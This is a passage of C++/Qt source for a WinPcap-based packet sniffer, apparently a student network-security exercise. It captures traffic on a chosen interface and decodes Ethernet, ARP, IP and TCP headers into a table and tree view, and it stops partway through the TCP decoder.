#define HAVE_REMOTE
#include "mainwindow.h"
#include "ui_mainwindow.h"
#include "pcap.h"
#include "tool.h"
#include "listenthread.h"
#include "winsock.h"
#include "winsock2.h"
#include <QDebug>
#include <QStandardItemModel>
#include <QtConcurrent/QtConcurrent>
#include <sendpacket.h>
#include <QMessageBox>
#include <QHeaderView>
#define LINE_LEN 16
#define ETHERNET_ADD_LEN 6
#define IP_ADD_LEN 4

unsigned char myMac[6] = { 0x4c,0x34,0x88,0xce,0xe1,0x2c };
unsigned char myIP[4] = { 0xc0,0xa8,0x0,0x7 };
unsigned char routerMac[6] = { 0xa4,0x56,0x02,0x56,0xec,0x4d };
unsigned char routerIP[4] = { 0xc0,0xa8,0x0,0x1 };
int listenThread::countIPPacket[4]={0,0,0,0};


//14字节以太网首部
struct EthernetHeader
{
    u_char DestMAC[6];    //目的MAC地址 6字节
    u_char SourMAC[6];   //源MAC地址 6字节
    u_short EthType;         //上一层协议类型，如0x0800代表上一层是IP协议，0x0806为arp  2字节
};

//28字节ARP帧结构
struct ArpHeader
{
    unsigned short hdType;   //硬件类型
    unsigned short proType;   //协议类型
    unsigned char hdSize;   //硬件地址长度
    unsigned char proSize;   //协议地址长度
    unsigned short op;   //操作类型，ARP请求（1），ARP应答（2），RARP请求（3），RARP应答（4）。
    u_char smac[6];   //源MAC地址
    u_char sip[4];   //源IP地址
    u_char dmac[6];   //目的MAC地址
    u_char dip[4];   //目的IP地址
};

//定义整个arp报文包，总长度42字节
struct ArpPacket {
    EthernetHeader ed;
    ArpHeader ah;
};

QStandardItemModel *listenThread::packetTableModel=NULL;
int listenThread::count=0;

MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    alldevs=NULL;
    currentDev=NULL;
    currentDevIndex=-1;
    curhandle=NULL;
    packetTableInit();
}

MainWindow::~MainWindow()
{

    pcap_freealldevs(alldevs);
    delete ui;
}

void MainWindow::packetTableInit(){
    //设置表格的各列的宽度值
    ui->packetTable->setColumnWidth(0,50);
    ui->packetTable->setColumnWidth(1,60);
    ui->packetTable->setColumnWidth(2,30);
    ui->packetTable->setColumnWidth(3,150);
    ui->packetTable->setColumnWidth(4,150);
    ui->packetTable->setColumnWidth(5,60);
    ui->packetTable->setColumnWidth(6,150);
    ui->packetTable->setColumnWidth(7,150);

    packet_model = new QStandardItemModel();
    //packet_model->setHorizontalHeaderItem(0, new QStandardItem(QObject::tr("No.")));
    packet_model->setHorizontalHeaderItem(0, new QStandardItem(QObject::tr("Time")));
    packet_model->setHorizontalHeaderItem(1, new QStandardItem(QObject::tr("Length")));
    packet_model->setHorizontalHeaderItem(2, new QStandardItem(QObject::tr("Frame Type")));
    packet_model->setHorizontalHeaderItem(3, new QStandardItem(QObject::tr("Source MAC")));
    packet_model->setHorizontalHeaderItem(4, new QStandardItem(QObject::tr("Destination MAC")));
    packet_model->setHorizontalHeaderItem(5, new QStandardItem(QObject::tr("Protocol")));
    packet_model->setHorizontalHeaderItem(6, new QStandardItem(QObject::tr("Source IP")));
    packet_model->setHorizontalHeaderItem(7, new QStandardItem(QObject::tr("Destination IP")));

    ui->packetTable->setModel(packet_model);

          //默认显示行头，如果你觉得不美观的话，我们可以将隐藏
    //      ui->student_tableview->verticalHeader()->hide();
          //设置选中时为整行选中
    ui->packetTable->setSelectionBehavior(QAbstractItemView::SelectRows);
          //设置表格的单元为只读属性，即不能编辑
    ui->packetTable->setEditTriggers(QAbstractItemView::NoEditTriggers);
          //如果你用在QTableView中使用右键菜单，需启用该属性
    //ui->packetTable->setContextMenuPolicy(Qt::CustomContextMenu);
}

void MainWindow::on_analysisButton_clicked()
{
    QString tempRule=NULL;
    //if(ui->ethernetBox->isChecked())
    //    tempRule.append(ui->ethernetBox->text());
    if(ui->arpBox->isChecked())
            tempRule.append(tr("arp"));
    if(ui->ipBox->isChecked())
        if(tempRule==NULL)
            tempRule.append(tr("ip"));
        else
            tempRule.append(tr(" or ")+tr("(ip "));
    if(ui->tcpBox->isChecked())
        tempRule.append(tr(" and ")+tr("tcp)"));
    else if(ui->udpBox->isChecked())
        tempRule.append(tr(" and ")+tr("udp)"));
    else if(ui->icmpBox->isChecked())
        tempRule.append(tr(" and ")+tr("icmp)"));
    else
        tempRule.append(tr(")"));
    if(ui->applicationBox->isChecked())
        isApp=true;
    else isApp=false;
    if(!isApp)
        setFilterRule(tempRule);
    else
        setFilterRule(tr("(port 53) or (port 67) or (port 68)"));
    listenThread *listenT=new listenThread(this,this->ui,curhandle);
    listenT->start();
    ui->analysisDisplayTree->setColumnCount(1);
    ui->analysisDisplayTree->setHeaderLabel(tr("Structure of Packet"));
    //ui->analysisDisplayTree->setColumnWidth(0,400);
    //ui->analysisDisplayTree->headerItem()->setText(1,tr("Data packet Content"));
    return;
}

void MainWindow::setFilterRule(QString rule){

    u_int netmask;
    struct bpf_program fcode;
    if(currentDev->addresses != NULL)
        /* Retrieve the mask of the first address of the interface */
        netmask=((struct sockaddr_in *)(currentDev->addresses->netmask))->sin_addr.S_un.S_addr;
    else
        /* If the interface is without addresses we suppose to be in a C class network */
        netmask=0xffffff;
    if (pcap_compile(curhandle, &fcode, rule.toLatin1().data(), 1, netmask) <0 )
    {
        qDebug()<<"\nUnable to compile the packet filter. Check the syntax.\n";
        return;
    }

    //set the filter
    if (pcap_setfilter(curhandle, &fcode)<0)
    {
        qDebug()<<"\nError setting the filter.\n";
        return;
    }

}

void MainWindow::setNetPort()
{
    pcap_if_t *d;
    char errbuf[PCAP_ERRBUF_SIZE];
    if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &(this->alldevs), errbuf) == -1)
    {
        qDebug()<<("Error in pcap_findalldevs_ex: %s\n", errbuf);
        return;
    }
    /* Print the list of port */
    ui->netportComboBox->addItem(tr(""));
    for(d=alldevs; d; d=d->next)
    {
        ui->netportComboBox->addItem(tr(d->name)+tr("\n")+tr(d->description));
    }

}

void MainWindow::on_netportSelectButton_clicked()
{
    pcap_if_t *d=alldevs;
    char errbuf[PCAP_ERRBUF_SIZE];
    int selectPort=ui->netportComboBox->currentIndex();
    if(selectPort==currentDevIndex)
        return;
    int flag=1;
    for(int i=1;d;i++){
        if(i==selectPort)
            flag=0;
        if(flag==0)
            break;
        d=d->next;

    }
    if(flag==0&&selectPort!=0){
        ui->displayNetportLabel->setText(tr("Selected Port: \n")+tr(d->description));
        currentDev=d;
        currentDevIndex=selectPort;
        qDebug()<<currentDev->name<<"\n"<<selectPort;
        /* Open the device */
        if ( (curhandle= pcap_open(currentDev->name,
                            100 /*snaplen*/,
                            PCAP_OPENFLAG_PROMISCUOUS /*flags*/,
                            20 /*read timeout*/,
                            NULL /* remote authentication */,
                            errbuf)
                            ) == NULL)
         {
             qDebug()<<("\nError opening adapter\n");
             return;
         }
    }
    else if(selectPort!=0)
        ui->displayNetportLabel->setText("Invalid Port");
    else
        ui->displayNetportLabel->setText("");
    /*
    struct pcap_pkthdr *header;
    const u_char *packet;
    while(1){
        int result = pcap_next_ex(curhandle, &header,&packet);
        if(result!=1)
            continue;
        listenThread::packet_handler(header,(unsigned char *)packet);
    }
    */

}

listenThread::listenThread(MainWindow *mainW,Ui::MainWindow *ui, pcap_t *adhandle){

    this->mainW=mainW;
    this->ui=ui;
    this->adhandle=adhandle;
    packetTableModel=mainW->packet_model;
    packetTableModel->removeRows(0,packetTableModel->rowCount());
    //ui->countlabel->setAlignment(QT::AlignHCenter);
}

void listenThread::run(){
    //int flag=0;
    qDebug()<<"start to catch\n";
    struct pcap_pkthdr *header;
    const u_char *packet;
    while(1){
        //flag++;
        //if(flag==5)
        //    break;
        int result = pcap_next_ex(adhandle, &header,&packet);
        if(result!=1)
            continue;
        listenThread::packet_handler(header,(unsigned char *)packet);
        if(count%10==0){
            ui->countlabel->clear();
            ui->countlabel->setText(tr("ARP:")+QString::number(countIPPacket[0])+tr(" ICMP:")+QString::number(countIPPacket[1])+tr(" TCP:")+QString::number(countIPPacket[2])+tr(" UDP:")+QString::number(countIPPacket[3]));
        }
    }
    qDebug()<<"end to catch\n";
}

void listenThread::packet_handler(const pcap_pkthdr *header, const unsigned char *pkt_data){

    int tempCount=count++;
    //qDebug()<<"get a packet\n";
    //packetTableModel->setItem(tempCount,0, new QStandardItem(QString::number(tempCount,10)));
    char tempchar[4][50];
    char timestr[16];
    time_t local_tv_sec;
    struct tm ltime;
    local_tv_sec = header->ts.tv_sec;
    localtime_s(&ltime, &local_tv_sec);
    strftime(timestr, sizeof timestr, "%H:%M:%S", &ltime);
    packetTableModel->setItem(tempCount,0, new QStandardItem(tr(timestr)));

    packetTableModel->setItem(tempCount,1, new QStandardItem(QString::number(header->len,10)));

    for(int i=0;i<ETHERNET_ADD_LEN;i++){
        tempchar[0][i]=pkt_data[i];
        tempchar[2][i]=pkt_data[i+ETHERNET_ADD_LEN];
    }
    tempchar[0][ETHERNET_ADD_LEN]='\0';
    tempchar[2][ETHERNET_ADD_LEN]='\0';
    char2Mac(tempchar[0],tempchar[1],ETHERNET_ADD_LEN);
    char2Mac(tempchar[2],tempchar[3],ETHERNET_ADD_LEN);
    packetTableModel->setItem(tempCount,3, new QStandardItem(tr(tempchar[3])));
    packetTableModel->setItem(tempCount,4, new QStandardItem(tr(tempchar[1])));
    if(pkt_data[ETHERNET_ADD_LEN*2]==0x08&&pkt_data[ETHERNET_ADD_LEN*2+1]==0x0){
        packetTableModel->setItem(tempCount,2,new QStandardItem(tr("IP")));
        analyzeIP(pkt_data+2*ETHERNET_ADD_LEN+2,tempCount);
    }
    else if(pkt_data[ETHERNET_ADD_LEN*2]==0x08&&pkt_data[ETHERNET_ADD_LEN*2+1]==0x06){
        packetTableModel->setItem(tempCount,2,new QStandardItem(tr("ARP")));
        analyzeARP(pkt_data+2*ETHERNET_ADD_LEN+2,tempCount);
        countIPPacket[0]++;
    }
    else if(pkt_data[ETHERNET_ADD_LEN*2]==0x08&&pkt_data[ETHERNET_ADD_LEN*2+1]==0x35){
        packetTableModel->setItem(tempCount,2,new QStandardItem(tr("RARP")));
        analyzeRARP(pkt_data+2*ETHERNET_ADD_LEN+2,tempCount);
    }
    else{
        packetTableModel->setItem(tempCount,2,new QStandardItem(tr("Unknown")));
        unknownEthernetPacket(tempCount);
    }
    packetWrite((u_char *)(pkt_data+2*ETHERNET_ADD_LEN+2),tempCount,header->len-12);
}

void listenThread::unknownEthernetPacket(int tempCount){
    packetTableModel->setItem(tempCount,2,new QStandardItem(tr("Unknown")));
    //可以添加该部分的功能以提高对其余网络层协议的解析能力
    return;
}

void listenThread::analyzeIP(const u_char *rest_pkt_data,int tempCount){

    if(rest_pkt_data[9]==0x1){
        packetTableModel->setItem(tempCount,5,new QStandardItem(tr("ICMP")));
        countIPPacket[1]++;
    }
    else if(rest_pkt_data[9]==0x6){
        packetTableModel->setItem(tempCount,5,new QStandardItem(tr("TCP")));
        countIPPacket[2]++;
    }
    else if(rest_pkt_data[9]==17){
        packetTableModel->setItem(tempCount,5,new QStandardItem(tr("UDP")));
        countIPPacket[3]++;
    }
    else
        packetTableModel->setItem(tempCount,5,new QStandardItem(tr("Unknown")));
    char tempchar[4][50];
    for(int i=0;i<IP_ADD_LEN;i++){
        tempchar[0][i]=rest_pkt_data[i+4*3];
        tempchar[2][i]=rest_pkt_data[i+IP_ADD_LEN+4*3];
    }
    tempchar[0][IP_ADD_LEN]='\0';
    tempchar[2][IP_ADD_LEN]='\0';
    char2IP(tempchar[0],tempchar[1],IP_ADD_LEN);
    char2IP(tempchar[2],tempchar[3],IP_ADD_LEN);
    packetTableModel->setItem(tempCount,6, new QStandardItem(tr(tempchar[1])));
    packetTableModel->setItem(tempCount,7, new QStandardItem(tr(tempchar[3])));

}

void listenThread::analyzeARP(const u_char *rest_pkt_data,int tempCount){

    char tempchar[8][50];
    for(int i=0;i<IP_ADD_LEN;i++){
        tempchar[4][i]=rest_pkt_data[i+14];
        tempchar[6][i]=rest_pkt_data[i+24];
    }
    for(int i=0;i<ETHERNET_ADD_LEN;i++){
        tempchar[0][i]=rest_pkt_data[i+8];
        tempchar[2][i]=rest_pkt_data[i+18];
    }
    char2Mac(tempchar[0],tempchar[1],ETHERNET_ADD_LEN);
    char2Mac(tempchar[2],tempchar[3],ETHERNET_ADD_LEN);
    char2IP(tempchar[4],tempchar[5],IP_ADD_LEN);
    char2IP(tempchar[6],tempchar[7],IP_ADD_LEN);
    packetTableModel->setItem(tempCount,3,new QStandardItem(tr(tempchar[1])));
    packetTableModel->setItem(tempCount,4,new QStandardItem(tr(tempchar[3])));
    packetTableModel->setItem(tempCount,6,new QStandardItem(tr(tempchar[5])));
    packetTableModel->setItem(tempCount,7,new QStandardItem(tr(tempchar[7])));
    //packetTableModel->setItem(tempCount,6,new QStandardItem(tr("")));

}

void listenThread::analyzeRARP(const u_char *rest_pkt_data,int tempCount){
    //有待完善对RARP的解析
    return;
}

void listenThread::packetWrite(u_char *rest_packet, int tempCount, int restPacketLen){
    QString filename=QString::number(tempCount+1,10);
    filename.append(".txt");
    QFile packetFile(tr("C:\\Users\\zhzhhao\\Desktop\\net_security_ex\\sniffer\\store\\")+filename);
    if(!packetFile.open(QIODevice::WriteOnly)){
        qDebug()<<"存储数据包失败\n";
        return;
    }
    QDataStream in(&packetFile);
    //QString temp=QString::fromLocal8Bit((char *)rest_packet,restPacketLen);

    //qDebug()<<temp.length();
    //packetFile.write((char *)rest_packet,restPacketLen);
    in.writeBytes((char *)rest_packet,restPacketLen);
    packetFile.flush();
    packetFile.close();
}

void MainWindow::on_packetTable_doubleClicked(const QModelIndex &index)
{
    int row=index.row();
    //qDebug()<<row;
    ui->analysisDisplayTree->clear();
    QTreeWidgetItem *frameRoot = new QTreeWidgetItem(ui->analysisDisplayTree,QStringList(QString("Frame")));
    QTreeWidgetItem *EthernetRoot = new QTreeWidgetItem(ui->analysisDisplayTree,QStringList(QString("Ethernet")));
    QFile packetFile(tr("C:\\Users\\zhzhhao\\Desktop\\net_security_ex\\sniffer\\store\\")+QString::number(row+1,10)+tr(".txt"));
    if(!packetFile.open(QIODevice::ReadOnly)){
        qDebug()<<"读取数据包失败\n";
        return;
    }
    QString packetData;
    //QDataStream out(&packetFile);
    char *packet_data;
    unsigned int len=listenThread::packetTableModel->item(row,1)->text().toInt()-12;
    //out.readBytes(packet_data,len);
    QByteArray packetStr1=packetFile.readAll();
    qDebug()<<packetStr1.length();
    packetData=QString::fromLatin1(packetStr1.data()+4,len);
    QByteArray packetStr;
    for(int i=0;i<len;i++)
        packetStr[i]=packetStr1[i+4];
    qDebug()<<packetData.length();
    packetFile.close();
    QList<QTreeWidgetItem *> FrameList;
    QTreeWidgetItem *fItem1=new QTreeWidgetItem;
    fItem1->setText(0,tr("Packet Number: ")+QString::number(row+1));
    FrameList.append(fItem1);
    QTreeWidgetItem *fItem2=new QTreeWidgetItem;
    fItem2->setText(0,tr("Packet Length: ")+(listenThread::packetTableModel->item(row,1)->text()));
    FrameList.append(fItem2);
    QTreeWidgetItem *fItem3=new QTreeWidgetItem;
    fItem3->setText(0,tr("Interface: ")+QString::number(currentDevIndex));
    FrameList.append(fItem3);
    frameRoot->insertChildren(0,FrameList);

    QList<QTreeWidgetItem *> EthernetList;
    QTreeWidgetItem *eItem1=new QTreeWidgetItem;
    eItem1->setText(0,tr("Source Mac Address: ")+listenThread::packetTableModel->item(row,3)->text());
    EthernetList.append(eItem1);
    QTreeWidgetItem *eItem2=new QTreeWidgetItem;
    eItem2->setText(0,tr("Destination Mac Address: ")+listenThread::packetTableModel->item(row,4)->text());
    EthernetList.append(eItem2);
    QTreeWidgetItem *eItem3=new QTreeWidgetItem;
    eItem3->setText(0,tr("Packet Protocol: ")+listenThread::packetTableModel->item(row,2)->text());
    //可能有问题，无法转换
    EthernetList.append(eItem3);
    EthernetRoot->insertChildren(0,EthernetList);
    //QString temp=listenThread::packetTableModel->item(row,2)->text();
    if(listenThread::packetTableModel->item(row,2)->text().toLatin1().data()[0]=='A'){
        QTreeWidgetItem *ArpRoot = new QTreeWidgetItem(ui->analysisDisplayTree,QStringList(QString("Address Revolution Protocol")));
        deeperArpAnalyze(packetStr,ArpRoot);
    }
    else{
        QTreeWidgetItem *IPRoot = new QTreeWidgetItem(ui->analysisDisplayTree,QStringList(QString("Internet Protocol")));
        QTreeWidgetItem *dataPRoot = new QTreeWidgetItem(ui->analysisDisplayTree,QStringList(QString("Transmission Control Protocol")));
        if(ui->applicationBox->isChecked())
            appRoot = new QTreeWidgetItem(ui->analysisDisplayTree,QStringList(QString("Application Protocol")));
        deeperIPAnalyze(packetStr,IPRoot,dataPRoot);
    }
    showPacketContent(packetStr);


}

void MainWindow::showPacketContent(QByteArray packetContent){
    //可优化
    QTreeWidgetItem *textViewItem=new QTreeWidgetItem(ui->analysisDisplayTree,QStringList(QString("Packet Raw Content")));
    QList<QTreeWidgetItem *> listContent;
    QString viewContent;
    int len=packetContent.length();
    QTreeWidgetItem *lineItem=NULL;
    for(int i=0,j=0;i<len||j!=0;i++,j++){
        if(i>=len){
            viewContent.append(tr(" "));
            for(int k=0;k<j;k++){
                if(packetContent[i-j+k]<32||packetContent[i-j+k]>126)
                    viewContent.append(tr("."));
                else
                    viewContent.append(packetContent.at(i-j+k));
            }
            viewContent.append(tr("\n"));
            break;
        }
        if(j<8){
            viewContent.append(QString("%1").arg((unsigned int)(unsigned char)packetContent[i],2,16,QChar('0')));
            viewContent.append(tr(" "));
            continue;
        }
        viewContent.append(tr(" "));
        QByteArray temp;
        for(int k=0;k<8;k++){
            if(packetContent[i-8+k]<32||packetContent[i-8+k]>126)
                temp.append('.');
            else
                temp.append(packetContent.at(i-8+k));
        }
        viewContent.append(QString::fromUtf8(temp));
        lineItem=new QTreeWidgetItem;
        lineItem->setText(0,viewContent);
        listContent.append(lineItem);
        viewContent.clear();
        j=-1;
        i--;
    }
    textViewItem->insertChildren(0,listContent);
}

void MainWindow::deeperArpAnalyze(QByteArray dataStr, QTreeWidgetItem *arpRoot){
    //QByteArray dataStr = data.toLatin1();
    QList<QTreeWidgetItem *> arpList;
    QTreeWidgetItem *aItem1=new QTreeWidgetItem;
    aItem1->setText(0,tr("Hardware Type: 0x")+QString::number(dataStr[0],16)+QString::number(dataStr[1],16));
    arpList.append(aItem1);
    QTreeWidgetItem *aItem2=new QTreeWidgetItem;
    aItem2->setText(0,tr("Protocol Type: 0x")+QString::number(dataStr[2],16)+QString::number(dataStr[3],16));
    arpList.append(aItem2);
    QTreeWidgetItem *aItem3=new QTreeWidgetItem;
    aItem3->setText(0,tr("Hardware Size: ")+QString::number(dataStr[4],10));
    arpList.append(aItem3);
    QTreeWidgetItem *aItem4=new QTreeWidgetItem;
    aItem4->setText(0,tr("Protocol Size: ")+QString::number(dataStr[5],10));
    arpList.append(aItem4);
    QTreeWidgetItem *aItem5=new QTreeWidgetItem;
    char temp=dataStr.at(7);
    if(dataStr.at(7)==0x1)
        aItem5->setText(0,tr("Opcode: Request"));
    else if(dataStr.data()[7]==0x2)
        aItem5->setText(0,tr("Opcode: Response"));
    arpList.append(aItem5);
    char tempchar[8][50];
    for(int i=0;i<IP_ADD_LEN;i++){
        tempchar[4][i]=dataStr[14+i];
        tempchar[6][i]=dataStr[24+i];
    }
    for(int i=0;i<ETHERNET_ADD_LEN;i++){
        tempchar[0][i]=dataStr[8+i];
        tempchar[2][i]=dataStr[18+i];
    }
    char2Mac(tempchar[0],tempchar[1],ETHERNET_ADD_LEN);
    char2Mac(tempchar[2],tempchar[3],ETHERNET_ADD_LEN);
    char2IP(tempchar[4],tempchar[5],IP_ADD_LEN);
    char2IP(tempchar[6],tempchar[7],IP_ADD_LEN);
    QTreeWidgetItem *aItem6=new QTreeWidgetItem;
    QTreeWidgetItem *aItem7=new QTreeWidgetItem;
    QTreeWidgetItem *aItem8=new QTreeWidgetItem;
    QTreeWidgetItem *aItem9=new QTreeWidgetItem;
    aItem6->setText(0,tr("Sender Mac Address: ")+tr(tempchar[1]));
    aItem7->setText(0,tr("Sender IP Address: ")+tr(tempchar[5]));
    aItem8->setText(0,tr("Target Mac Address: ")+tr(tempchar[3]));
    aItem9->setText(0,tr("Target IP Address: ")+tr(tempchar[7]));
    arpList.append(aItem6);
    arpList.append(aItem7);
    arpList.append(aItem8);
    arpList.append(aItem9);

    arpRoot->insertChildren(0,arpList);

}

void MainWindow::deeperIPAnalyze(QByteArray dataStr, QTreeWidgetItem *ipRoot, QTreeWidgetItem *transRoot){

    //QByteArray dataStr = data.toLocal8Bit();
    QList<QTreeWidgetItem *> ipList;
    QTreeWidgetItem *iItem1=new QTreeWidgetItem;
    iItem1->setText(0,tr("Version: ")+QString::number(((dataStr[0]&0xf0)>>4),10));
    ipList.append(iItem1);
    QTreeWidgetItem *iItem2=new QTreeWidgetItem;
    iItem2->setText(0,tr("Header Length: ")+QString::number(((dataStr[0]&0x0f))*4,10)+tr(" bytes"));
    ipList.append(iItem2);
    QTreeWidgetItem *iItem3=new QTreeWidgetItem;
    iItem3->setText(0,tr("Differentiated Services Field: 0x")+QString::number(dataStr[1],16));
    ipList.append(iItem3);
    QTreeWidgetItem *iItem4=new QTreeWidgetItem;
    iItem4->setText(0,tr("Total Length: ")+QString::number(*((unsigned short *)(dataStr.data()+2)),10));
    ipList.append(iItem4);
    QTreeWidgetItem *iItem5=new QTreeWidgetItem;
    iItem5->setText(0,tr("Identification: 0x")+QString::number(*((unsigned short *)(dataStr.data()+4)),16));
    ipList.append(iItem5);
    QTreeWidgetItem *iItem6=new QTreeWidgetItem;
    iItem6->setText(0,tr("Flags: 0x")+QString::number((dataStr[6]&0xe0)>>5,16));
    ipList.append(iItem6);
    QTreeWidgetItem *iItem7=new QTreeWidgetItem;
    iItem7->setText(0,tr("Fragment Offset: ")+QString::number((*((unsigned short *)(dataStr.data()+6))&0x1fff),10));
    ipList.append(iItem7);
    QTreeWidgetItem *iItem8=new QTreeWidgetItem;
    iItem8->setText(0,tr("Time to Live: ")+QString::number((unsigned char)(dataStr[8]),10));
    ipList.append(iItem8);
    QTreeWidgetItem *iItem9=new QTreeWidgetItem;
    if(dataStr[9]==0x1){
        iItem9->setText(0,tr("Protocol: ICMP"));
    }
    else if(dataStr[9]==0x6){
        iItem9->setText(0,tr("Protocol: TCP"));
    }
    else if(dataStr[9]==0x11){
        iItem9->setText(0,tr("Protocol: UDP"));
    }
    else
        iItem9->setText(0,tr("Protocol: Unknown"));
    ipList.append(iItem9);
    QTreeWidgetItem *iItem10=new QTreeWidgetItem;
    iItem10->setText(0,tr("Header checksum status: 0x")+QString::number(*((unsigned short *)(dataStr.data()+10)),16));
    ipList.append(iItem10);

    char tempchar[4][50];
    for(int i=0;i<IP_ADD_LEN;i++){
        tempchar[0][i]=dataStr[i+4*3];
        tempchar[2][i]=dataStr[i+IP_ADD_LEN+4*3];
    }
    tempchar[0][IP_ADD_LEN]='\0';
    tempchar[2][IP_ADD_LEN]='\0';
    char2IP(tempchar[0],tempchar[1],IP_ADD_LEN);
    char2IP(tempchar[2],tempchar[3],IP_ADD_LEN);
    QTreeWidgetItem *iItem11=new QTreeWidgetItem;
    iItem11->setText(0,tr("Source IP Address: ")+tr(tempchar[1]));
    ipList.append(iItem11);
    QTreeWidgetItem *iItem12=new QTreeWidgetItem;
    iItem12->setText(0,tr("Destination IP Address: ")+tr(tempchar[3]));
    ipList.append(iItem12);

    ipRoot->insertChildren(0,ipList);

    QByteArray restPart;
    for(int i=0;i<dataStr.length()-((dataStr[0]&0x0f))*4;i++){
        restPart[i]=dataStr[i+((dataStr[0]&0x0f))*4];
    }

    if(iItem9->text(0).toLatin1().at(10)=='T')
        deeperTCPAnalyze(restPart,transRoot);
    else if(iItem9->text(0).toLatin1().at(11)=='D')
        deeperUDPAnalyze(restPart,transRoot);
    else if(iItem9->text(0).toLatin1().at(10)=='I')
        deeperICMPAnalyze(restPart,transRoot);
    else{
        new QTreeWidgetItem(transRoot,QStringList(QString("Unknown Transimition Protocol")));
    }
}

void MainWindow::on_tcpBox_clicked(bool checked)
{
    if(checked==true){
        ui->ipBox->setChecked(true);
        ui->udpBox->setChecked(false);
        ui->icmpBox->setChecked(false);
    }
}

void MainWindow::on_udpBox_clicked(bool checked)
{
    if(checked==true){
        ui->ipBox->setChecked(true);
        ui->tcpBox->setChecked(false);
        ui->icmpBox->setChecked(false);
    }
}

void MainWindow::on_icmpBox_clicked(bool checked)
{
    if(checked==true){
        ui->ipBox->setChecked(true);
        ui->udpBox->setChecked(false);
        ui->tcpBox->setChecked(false);
    }
}

void MainWindow::on_applicationBox_clicked(bool checked)
{
    if(checked){
        ui->tcpBox->setChecked(false);
        ui->arpBox->setChecked(false);
        ui->ipBox->setChecked(true);
        ui->udpBox->setChecked(true);
        ui->tcpBox->setChecked(false);
    }
}

QByteArray MainWindow::Mac2char(QString HexString){
    bool ok;
    QByteArray ret;
    HexString = HexString.trimmed();
    HexString = HexString.simplified();
    QStringList sl = HexString.split(" ");

    foreach (QString s, sl) {
        if(!s.isEmpty())
        {
            char c = s.toInt(&ok,16)&0xFF;
            if(ok){
                ret.append(c);
            }else{
                qDebug()<<"非法的16进制字符："<<s;
                QMessageBox::warning(0,tr("错误："),QString("非法的16进制字符: \"%1\"").arg(s));
            }
        }
    }
    qDebug()<<ret;
    return ret;
}

QByteArray MainWindow::IP2char(QString sourceStr){
    QByteArray s;
    char t;
    for(int i=0;i<4;i++){
        t=sourceStr.section('.',i,i).toInt();
        s.append(t);
    }
    return s;
}

//UDP协议头
struct udphdr
{
    u_int16_t source_port; /*源地址端口*/
    u_int16_t dest_port;    /*目的地址端口*/
    u_int16_t len;     /*UDP长度*/
    u_int16_t check;   /*UDP校验和*/
};

//TCP协议头
struct tcphdr
{
    u_int16_t   source_port;         /*源地址端口*/
    u_int16_t   dest_port;           /*目的地址端口*/
    u_int32_t   seq;            /*序列号*/
    u_int32_t   ack_seq;        /*确认序列号*/

    u_int16_t len:4,
    res:6,              /*保留*/
    urg:1,              /*紧急指针标志*/
    ack:1,              /*确认序号标志*/
    psh:1,              /*接收方尽快将数据放到应用层标志*/
    rst:1,              /*重置连接标志*/
    syn:1,              /*请求连接标志*/
    fin:1;              /*关闭连接标志*/

    u_int16_t   window;         /*滑动窗口大小*/
    u_int16_t   check;          /*校验和*/
    u_int16_t   urg_ptr;        /*紧急字段指针*/
};

void MainWindow::deeperTCPAnalyze(QByteArray transData, QTreeWidgetItem *transRoot){
    struct tcphdr *tcp_protocol;
    u_int16_t checksum;

    tcp_protocol = (struct tcphdr *) transData.data();
    checksum =ntohs(tcp_protocol->check);

    QList<QTreeWidgetItem *> tcpList;
    QTreeWidgetItem *tItem1=new QTreeWidgetItem;
    tItem1->setText(0,tr("Source Port: ")+QString::number(ntohs(tcp_protocol->source_port),10));
    tcpList.append(tItem1);
    QTreeWidgetItem *tItem2=new QTreeWidgetItem;
    tItem2->setText(0,tr("Destination Port: ")+QString::number(ntohs(tcp_protocol->dest_port),10));
    tcpList.append(tItem2);
    QTreeWidgetItem *tItem3=new QTreeWidgetItem;
    tItem3->setText(0,tr("Sequence Number: ")+QString::number(ntohl(tcp_protocol->seq),10));
    tcpList.append(tItem3);
    QTreeWidgetItem *tItem4=new QTreeWidgetItem;
    tItem4->setText(0,tr("Acknowledgment Number: ")+QString::number(ntohl(tcp_protocol->ack_seq),10));
    tcpList.append(tItem4);
    QTreeWidgetItem *tItem6=new QTreeWidgetItem;
    tItem6->setText(0,tr("Header Length: ")+QString::number(tcp_protocol->len,10));
    tcpList.append(tItem6);

    QTreeWidgetItem *tItem5=new QTreeWidgetItem;
    tItem5->setText(0,tr("Flags: 0x")+QString::number((*(unsigned short *)((char *)tcp_protocol+12)&0x0fff),16));
    tcpList.append(tItem5);
    QList<QTreeWidgetItem *> flagsList;
    QTreeWidgetItem *tItem7=new QTreeWidgetItem;
    tItem7->setText(0,tr("Reserved: 0x")+QString::number(tcp_protocol->res,16));
    flagsList.append(tItem7);
    QTreeWidgetItem *tItem8=new QTreeWidgetItem;
    tItem8->setText(0,tr("URG Flag: ")+QString::number(tcp_protocol->urg,2));
    flagsList.append(tItem8);
    QTreeWidgetItem *tItem9=new QTreeWidgetItem;
    tItem9->setText(0,tr("ACK Flag: ")+QString::number(tcp_protocol->ack,2));
    flagsList.append(tItem9);
    QTreeWidgetItem *tItem10=new QTreeWidgetItem;
    tItem10->setText(0,tr("PSH Flag: ")+QString::number(tcp_protocol->psh,2));
    flagsList.append(tItem10);
    QTreeWidgetItem *tItem11=new QTreeWidgetItem;
    tItem11->setText(0,tr("RST Flag: ")+QString::number(tcp_protocol->rst,2));
    flagsList.append(tItem11);
    QTreeWidgetItem *tItem12=new QTreeWidgetItem;
    tItem12->setText(0,tr("SYN Flag: ")+QString::number(tcp_protocol->syn,2));
    flagsList.append(tItem12);
    QTreeWidgetItem *tItem13=new QTreeWidgetItem;
    tItem13->setText(0,tr("FIN Flag: ")+QString::number(tcp_protocol->fin,2));
    flagsList.append(tItem13);
    tItem5->insertChildren(0,flagsList);

    QTreeWidgetItem *tItem14=new QTreeWidgetItem;
    tItem14->setText(0,tr("Window Size: ")+QString::number(tcp_protocol->window,10));
    tcpList.append(tItem14);
    QTreeWidgetItem *tItem15=new QTreeWidgetItem;
    tItem15->setText(0,tr("Checksum: 0x")+QString::number(tcp_protocol->check,16));
    tcpList.append(tItem15);
    QTreeWidgetItem *tItem16=new QTreeWidgetItem;
    tItem16->setText(0,tr("Urgent Pointer: ")+QString::number(tcp_protocol->urg_ptr,10));
    tcpList.append(tItem16);

    transRoot->insertChildren(0,tcpList);


        qDebug()<<"---------TCP协议---------";
